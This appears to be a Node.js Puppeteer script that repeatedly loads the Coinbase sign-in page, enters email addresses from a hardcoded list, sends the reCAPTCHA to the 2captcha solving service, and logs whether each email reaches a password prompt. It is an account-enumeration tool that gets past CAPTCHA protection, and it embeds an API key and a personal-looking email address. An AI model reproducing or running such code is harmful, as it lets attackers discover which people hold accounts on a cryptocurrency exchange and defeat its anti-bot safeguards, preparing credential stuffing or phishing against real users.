const puppeteer = require('puppeteer')
const request = require('request-promise-native')
const poll = require('promise-poller').default

const config = {
    pageurl: 'https://login.coinbase.com/signin?login_challenge=da2d17864e934759a3842839d9ee59a0',
    apiKey: 'd34b6cea5d999aea03766d376434a179', //require('./api-key'),
    apiSubmitUrl: 'http://2captcha.com/in.php',
    apiRetrieveUrl: 'http://2captcha.com/res.php',
}

const emails =[
    'anpch@example.com',
    'adam.cela21@gmail.com',
    'adam.cela21@gmail.com',
    'adam.cela21@gmail.com',
    'adam.cela21@gmail.com',
    'adam.cela21@gmail.com',
    'adam.cela21@gmail.com',
    'adam.cela21@gmail.com',
    'adam.cela21@gmail.com',
    'adam.cela21@gmail.com',
    'adam.cela21@gmail.com',
    'adam.cela21@gmail.com',
    'adam.cela21@gmail.com',
    'adam.cela21@gmail.com',
    'adam.cela21@gmail.com',
    'adam.cela21@gmail.com',
    'adam.cela21@gmail.com',
    'anpch@example.com',
    'anpch@example.com',
    'anpch@example.com',
    'anpch@example.com',
    'anpch@example.com',
    'anpch@example.com',
    'anpch@example.com',
    'anpch@example.com',
    'anpch@example.com',
    'anpch@example.com',
    'anpch@example.com',
    'anpch@example.com',
    'anpch@example.com',
    'anpch@example.com',
    'anpch@example.com',
    'anpch@example.com',
    'anpch@example.com',
    'anpch@example.com',
    'anpch@example.com',
]

const chromeOptions = {
    headless: false,
}


async function dowork(){
    const browser = await puppeteer.launch(chromeOptions)
    
    for(var i=0;;i++){
        try{

            const page = await browser.newPage()

            console.log(`Navigating to ${config.pageurl}`)
            await page.goto(config.pageurl)
            
            await page.waitForSelector('#Email')

            const data = await page.$eval('[data-testid="visible_recaptcha"]', el => {
                var siteKey =  el.getAttribute('data-sitekey');
                var enabled = el.childElementCount;
                return {
                    siteKey: siteKey,
                    enabled: enabled
                }
            });
            
            await page.type('#Email', emails[i%10]);

            if(data.enabled)
            {
                const requestId = await initiateCaptchaRequest(config.apiKey, data.sitekey)
            
                const response = await pollForReqeustResults(config.apiKey, requestId)
                
                console.log(`Entering recaptcha response ${response}`)
                await page.evaluate(()=>{
                    var o = document.querySelector("[name='g-recaptcha-response']")
                    o&&(o.innerHTML=response)
                })
            }
                    
            console.log(`Submitting...`)
            await page.click('button[type="submit"]')
            await page.waitForTimeout(500);
            const valid = await page.$('#Password')
            console.log(i, valid==null?'no':'yes')
            page.close()
            timeout(100)
        }
        catch(err){
            console.log(err)
            break;
        }
    }
    timeout(999999999999);

}


async function initiateCaptchaRequest(apiKey, sitekey){
 
    console.log(`Submitting solution request to 2captcha for ${config.pageurl}`)
    const response = await request.post('http://2captcha.com/in.php?key=' + apiKey + '&method=userrecaptcha&googlekey=' + sitekey + '&pageurl='+config.pageurl+'&json=1')

    return  JSON.parse(response).request;
}

async function pollForReqeustResults(key, id, retries = 30, interval = 1500, delay = 1500){
    console.log(`Waiting for ${delay} milliseconds...`)
    await timeout(delay)

    return poll({
        taskFn: requestCaptchaResults(key, id),
        interval,
        retries
    })
}

function requestCaptchaResults(apiKey, requestId){
    const url = `${config.apiRetrieveUrl}?key=${apiKey}&action=get&id=${requestId}&json=1`
    return async function(){
        return new Promise(async function(resolve, reject){
            console.log(`Polling for response...`)
            const rawResponse = await request.get(url)
            const resp = JSON.parse(rawResponse)
            console.log(resp)
            if(resp.status === 0)return reject(resp.request)
            console.log('Response received')
            resolve(resp.request)
        })
    }
}


const timeout = ms => new Promise(res=>setTimeout(res, ms))

dowork()